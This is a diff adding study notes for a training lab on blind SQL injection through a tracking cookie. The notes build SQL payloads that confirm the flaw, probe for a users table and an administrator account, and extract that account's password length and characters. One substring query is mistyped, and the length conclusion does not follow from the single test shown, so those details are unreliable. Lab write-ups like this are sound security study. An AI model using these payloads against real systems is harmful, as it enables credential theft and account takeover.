@@ -1,0 +1,39 @@
+Lab 11 - Blind SQL Injection with conditional responses
+
+Vulnerable parameter - tracking cookie
+
+End Goals:
+1) Enumerate the password of the administrator
+2) Log in as the admnistrator user
+
+Analysis:
+1) Confirm that the parameter is vulnerable to blind SQLi
+
+select tracking-id from tracking-table where trackingId = 'it5iywXEbxbE5Bck'
+
+-> If this tracking id exists -> query returns value -> Welcome Back message
+-> If the tracking id doesn't exist -> query returns nothing -> no Welcome Back message
+
+select tracking-id from tracking-table where trackingId = 'it5iywXEbxbE5Bck' and 1=1--'
+-> TRUE -> Welcome Back
+
+select tracking-id from tracking-table where trackingId = 'it5iywXEbxbE5Bck' and 1=0--'
+-> False -> no Welcome Back
+
+2) Confirm that we have a users table
+
+SELECT tracking-id FROM tracking-table WHERE trackingId = 'it5iywXEbxbE5Bck' AND (SELECT 'x' FROM users LIMIT 1)='x'--'
+-> Users table exists in database.
+
+3) Confirm that username administrator exists in users table
+
+SELECT tracking-id FROM tracking-table WHERE trackingId = 'it5iywXEbxbE5Bck' AND (SELECT username FROM users WHERE username='administrator')='administrator'--
+-> administrator user exists 
+
+4) Enumerate the password of the administrator user 
+
+SELECT tracking-id FROM tracking-table WHERE trackingId = 'it5iywXEbxbE5Bck' AND (SELECT username FROM users WHERE username='administrator' and LENGTH(password)>20)='administrator'--
+-> password is exactly 20 characters
+
+SELECT tracking-id FROM tracking-table WHERE trackingId = 'it5iywXEbxbE5Bck' AND (SELECT substring(password.1.1) FROM users WHERE username='administrator')='a'--
+
